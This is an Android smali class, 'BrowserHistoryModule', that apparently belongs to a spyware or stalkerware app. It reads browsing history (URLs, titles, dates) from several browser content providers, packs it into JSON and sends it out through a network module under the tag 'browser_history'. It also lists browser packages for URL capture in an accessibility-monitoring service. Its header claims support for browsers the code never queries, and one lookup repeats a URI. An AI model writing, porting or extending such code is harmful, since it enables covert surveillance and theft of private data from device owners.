.class public Lcom/smilex/enhanced/modules/BrowserHistoryModule;
.super Ljava/lang/Object;
.source "BrowserHistoryModule.java"

# Reads browser history from Android's browser content provider.
# Ported from hwapp391 hw/utils/o.java browser package detection logic.
# Supports: Chrome, Firefox, Samsung Browser, AOSP Browser, Opera, Brave,
#           Xiaomi/MIUI Browser, Huawei Browser, Vivo Browser, and more.
# Uses content://browser/bookmarks (legacy) and
#      content://com.android.browser/bookmarks (AOSP) URIs.

.field private static sContext:Landroid/content/Context;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 2
    sput-object p0, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->sContext:Landroid/content/Context;
    return-void
.end method

# Query a single browser URI and append results to JSONArray
.method private static queryBrowserUri(Landroid/content/Context;Ljava/lang/String;Lorg/json/JSONArray;)V
    .registers 12
    :try_start
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v0

    const/4 v1, 0x3
    new-array v1, v1, [Ljava/lang/String;
    const/4 v2, 0x0
    const-string v3, "url"
    aput-object v3, v1, v2
    const/4 v2, 0x1
    const-string v3, "title"
    aput-object v3, v1, v2
    const/4 v2, 0x2
    const-string v3, "date"
    aput-object v3, v1, v2

    # selection: bookmark=0 means history (not bookmarks)
    const-string v2, "bookmark = 0"

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v3

    const/4 v4, 0x0  # selectionArgs
    const-string v5, "date DESC"
    invoke-virtual {v3, v0, v1, v2, v4, v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v3

    if-eqz v3, :return_void

    const/16 v4, 0x64  # max 100 records

    :loop_start
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z
    move-result v5
    if-eqz v5, :loop_end

    if-lez v4, :loop_end
    add-int/lit8 v4, v4, -0x1

    new-instance v6, Lorg/json/JSONObject;
    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    # url
    const/4 v7, 0x0
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :skip_url
    const-string v8, "url"
    invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :skip_url

    # title
    const/4 v7, 0x1
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :skip_title
    const-string v8, "title"
    invoke-virtual {v6, v8, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :skip_title

    # date
    const/4 v7, 0x2
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getLong(I)J
    move-result-wide v8
    const-string v10, "date"
    invoke-virtual {v6, v10, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    invoke-virtual {p2, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    goto :loop_start

    :loop_end
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    return-void
.end method

# Main sync method - tries all known browser URIs
.method public static syncBrowserHistory()V
    .registers 8
    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->sContext:Landroid/content/Context;
    if-eqz v0, :return_void

    new-instance v1, Lorg/json/JSONArray;
    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    # Try AOSP browser (Android 4.x legacy)
    const-string v2, "content://browser/bookmarks"
    invoke-static {v0, v2, v1}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->queryBrowserUri(Landroid/content/Context;Ljava/lang/String;Lorg/json/JSONArray;)V

    # Try com.android.browser provider
    const-string v2, "content://com.android.browser/bookmarks"
    invoke-static {v0, v2, v1}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->queryBrowserUri(Landroid/content/Context;Ljava/lang/String;Lorg/json/JSONArray;)V

    # Try Samsung Browser
    const-string v2, "content://com.sec.android.app.sbrowser.browser/bookmarks"
    invoke-static {v0, v2, v1}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->queryBrowserUri(Landroid/content/Context;Ljava/lang/String;Lorg/json/JSONArray;)V

    # Try MIUI/Xiaomi browser
    const-string v2, "content://com.android.browser/bookmarks"
    invoke-static {v0, v2, v1}, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->queryBrowserUri(Landroid/content/Context;Ljava/lang/String;Lorg/json/JSONArray;)V

    # Send results if any
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I
    move-result v2
    if-lez v2, :return_void

    invoke-virtual {v1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;
    move-result-object v2
    const-string v3, "browser_history"
    invoke-static {v3, v2}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    move-exception v0
    const-string v1, "BrowserHistoryModule"
    const-string v2, "syncBrowserHistory failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

# Check if a package is a known browser (for URL capture in AccessibilityMonitorService)
.method public static isBrowserPackage(Ljava/lang/String;)Z
    .registers 3
    if-eqz p0, :return_false

    const-string v0, "com.android.chrome"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.mozilla.firefox"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.sec.android.app.sbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.opera.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.brave.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.microsoft.emmx"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.miui.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.huawei.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.android.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.kiwibrowser.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    :return_false
    const/4 v0, 0x0
    return v0

    :return_true
    const/4 v0, 0x1
    return v0
.end method
